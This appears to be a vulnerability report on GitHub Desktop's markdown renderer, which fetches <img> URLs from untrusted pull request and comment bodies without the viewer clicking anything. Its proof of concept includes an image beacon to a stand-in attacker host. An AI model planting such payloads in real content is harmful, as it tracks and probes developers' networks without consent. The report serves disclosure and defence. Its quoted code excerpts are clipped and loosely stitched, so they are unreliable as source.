### Title
Untrusted PR/Issue/Commit Markdown Renders Live `<img>` Tags, Enabling Blind SSRF/Beaconing from the User's Machine - ([File: app/src/ui/lib/sandboxed-markdown.tsx])

### Summary
`SandboxedMarkdown` renders attacker-controlled markdown (pull request bodies, PR/issue comments, commit descriptions) by running it through `marked` and `DOMPurify.sanitize()` with default settings, then injecting the resulting HTML into a `data:` URI loaded into an iframe. [1](#0-0) 
Only `<a>` link navigation is intercepted and validated before any network access is allowed; there is no equivalent gate for `<img>` (or other resource-fetching) elements, so any `src` value that survives DOMPurify's default sanitization (this includes arbitrary `http(s)` URLs) is fetched automatically and unconditionally as soon as the markdown is rendered. [2](#0-1) 

### Finding Description
`SandboxedMarkdown` is used to render fully untrusted, remote-controlled content: pull request descriptions, PR comments/reviews, and PR quick-view bodies fetched from the GitHub API. [3](#0-2) [4](#0-3) 

The rendering pipeline is:
1. `marked(markdown, { gfm: true, breaks: true })` converts markdown to HTML.
2. `DOMPurify.sanitize(...)` is called with no custom allow-list configuration (no `ALLOWED_TAGS`, `ALLOWED_URI_REGEXP`, or `img`-specific hardening), so DOMPurify's defaults apply — which permit `<img src="http://...">` with an arbitrary absolute URL.
3. The resulting HTML string is base64-embedded into a `data:text/html` URI and loaded into an iframe with `sandbox="allow-same-origin"` (but no `allow-scripts`), meaning script execution is blocked but resource loading (images, CSS `url()`s, etc.) is not. [5](#0-4) [6](#0-5) 

The only network-access guard implemented anywhere in this component is `setupLinkInterceptor`, which prevents automatic navigation on anchor clicks and requires the user to click a link before `onMarkdownLinkClicked` fires: [2](#0-1) 

No comparable gate exists for `<img>` elements — the component's own `onDocumentDOMContentLoaded` handler only wires up `img.onload` for height recalculation, it never inspects or blocks the `src`: [7](#0-6) 

The `applyFilters` node-filter pipeline (mentions, emoji, issue/commit links, video tags, etc.) rewrites specific text/anchor patterns but does not touch or restrict arbitrary `<img>` tags coming out of the raw markdown/HTML: [8](#0-7) 


Because the markdown originates from a PR author (fork contributor), a PR comment author, or any GitHub object the API returns, this is the same broken invariant as the reported jsreport bug: content that is nominally just "display text" is allowed to cause automatic, un-consented outbound network requests to attacker-chosen destinations the moment the content is rendered — no click, no explicit user action beyond opening/viewing the PR.

### Impact Explanation
When a victim opens a malicious pull request (via the PR Quick View, PR list, or a desktop notification for a PR comment/review), the app will automatically issue outbound HTTP(S) requests to any URL the attacker embeds in an `<img src="...">` tag inside the PR/comment body — without any click or confirmation. This is exploitable to:
- Perform SSRF-style probing/beaconing from the developer's machine/network to attacker-chosen hosts (including internal-only or cloud metadata-style addresses reachable from the developer's corporate network), silently confirming reachability and leaking client IP/User-Agent/timing.
- Exfiltrate information embedded by the app into the URL if any dynamic values were ever interpolated into rendered markdown, or simply act as a tracking/beacon pixel to fingerprint when a specific developer views a PR (deanonymizing code review activity, timing attacks against private repos).

This mirrors the "SSRF" half of the reported jsreport chain (arbitrary `<img>`/network-triggering tags in attacker HTML causing unconditional outbound requests). It does not by itself achieve RCE/token exfiltration — I did not find a reachable path for the fetched `Authorization` header (added only by `installAuthenticatedImageFilter` and scoped strictly by origin match against known signed-in endpoints, and re-evaluated per-hop on redirects) to leak to an attacker-controlled origin, so I'm not asserting credential theft here — only unauthenticated SSRF/beaconing, which is still a valid, unprivileged, no-consent network-access primitive triggered purely by viewing attacker content.

### Likelihood Explanation
High. Any external contributor can open a pull request or leave a comment against a public repository the victim has cloned in Desktop; Desktop automatically surfaces PR bodies/comments in the PR Quick View and notification popups, both of which use `SandboxedMarkdown` without user interaction beyond simply viewing the PR/notification. No prior trust relationship, admin rights, or local access is required — this matches the "Valid Impact" criteria (attacker controls a GitHub API object; result triggers unprompted network activity).

### Recommendation
- Configure `DOMPurify.sanitize()` with an explicit, restrictive URI/attribute policy (e.g., `ALLOWED_URI_REGEXP`) that only allows `https:` (and `data:` for inline images if desired) schemes, and consider stripping/rewriting `img[src]`/`background`/CSS `url()` references so they route through an internal allow-listed proxy (similar to GitHub.com's Camo image proxy) rather than being fetched directly by the renderer.
- Extend the existing `setupLinkInterceptor` pattern to cover resource-fetching elements: intercept `<img>` loads (and any other tag with a `src`/`href`/`background` capable of triggering a network request) and require explicit opt-in/whitelisting before the sandboxed iframe is allowed to make the request, mirroring how link clicks already require `onMarkdownLinkClicked` validation.
- Audit all other `SandboxedMarkdown` consumers (`pull-request-quick-view.tsx`, `pull-request-comment-like.tsx`, `expandable-commit-summary.tsx`, `copilot-conflicts-resolution-summary.tsx`, `release-notes-dialog.tsx`) to confirm none of them pass content sourced from an untrusted party without the same protection.

### Proof of Concept
1. As an external contributor, open a pull request (or leave a PR/review comment) against a public repository against which the victim uses GitHub Desktop.
2. In the PR/comment body, include:
   ```markdown
   Some description text.

   <img src="https://attacker.example.com/beacon.png?id=whatever" width="1" height="1">
   ```
3. Victim opens GitHub Desktop, browses to that repository, and either opens the PR in the "PR Quick View" popover or receives/opens the PR-comment desktop notification.
4. `SandboxedMarkdown.renderMarkdown` sanitizes and injects the HTML (including the `<img>` tag) into the iframe; the iframe automatically issues the GET request to `https://attacker.example.com/beacon.png?...` with no click or confirmation from the victim, confirming the SSRF/beacon fires purely by viewing attacker-controlled content.   public renderMarkdown = async () => {
```typescript
    const { markdown } = this.props

    const body = DOMPurify.sanitize(
      marked(markdown, {
        // https://marked.js.org/using_advanced  If true, use approved GitHub
        // Flavored Markdown (GFM) specification.
        gfm: true,
        // https://marked.js.org/using_advanced, If true, add <br> on a single
        // line break (copies GitHub behavior on comments, but not on rendered
        // markdown files). Requires gfm be true.
        breaks: true,
      })
    )

    const styleSheet = await this.getInlineStyleSheet()

    // If component got unmounted while we were loading the style sheet
    // frameref will be null.
    if (this.frameRef === null) {
      return
    }

    const src = `
      <html>
        <head>
          ${this.getBaseTag(this.props.baseHref)}
          ${styleSheet}
        </head>
        <body class="markdown-body">
          <div id="content">
          ${body}
          </div>
        </body>
      </html>
    `

    // We used this `Buffer.toString('base64')` approach because `btoa` could not
    // convert non-latin strings that existed in the markedjs.
    const b64src = Buffer.from(src, 'utf8').toString('base64')

    // We are using `src` and data uri as opposed to an html string in the
    // `srcdoc` property because the `srcdoc` property renders the html in the
    // parent dom and we want all rendering to be isolated to our sandboxed iframe.
    // -- https://csplite.com/csp/test188/
    const oldDocument = this.frameRef.contentDocument
    this.currentDocument = null
    this.frameRef.src = `data:text/html;charset=utf-8;base64,${b64src}`
```

```typescript
  private setupLinkInterceptor(doc: Document): void {
    doc.addEventListener('click', ev => {
      if (doc.defaultView && ev.target instanceof doc.defaultView.Element) {
        const a = ev.target.closest('a')

          ev.preventDefault()

          if (/^https?:/.test(a.protocol)) {
            this.props.onMarkdownLinkClicked?.(a.href)
```

```typescript
  private async applyFilters(doc: Document) {
    const { emoji, repository, markdownContext } = this.props
    const filters = buildCustomMarkDownNodeFilterPipe({
      emoji,
      repository,
      markdownContext,
    })

    for (const nodeFilter of filters) {
      let docMutated = false
      const walker = nodeFilter.createFilterTreeWalker(doc)

      let node = walker.nextNode()
      while (node !== null) {
        const replacementNodes = await nodeFilter.filter(node)

        if (this.currentDocument !== doc) {
          // Abort, the document has changed
          return
        }

        const currentNode = node
        node = walker.nextNode()

        if (replacementNodes === null) {
          continue
        }

        docMutated = true

        for (const replacementNode of replacementNodes) {
          currentNode.parentNode?.insertBefore(replacementNode, currentNode)
        }
        currentNode.parentNode?.removeChild(currentNode)
      }

      if (docMutated) {
        this.refreshHeight()
      }
    }
  }
```
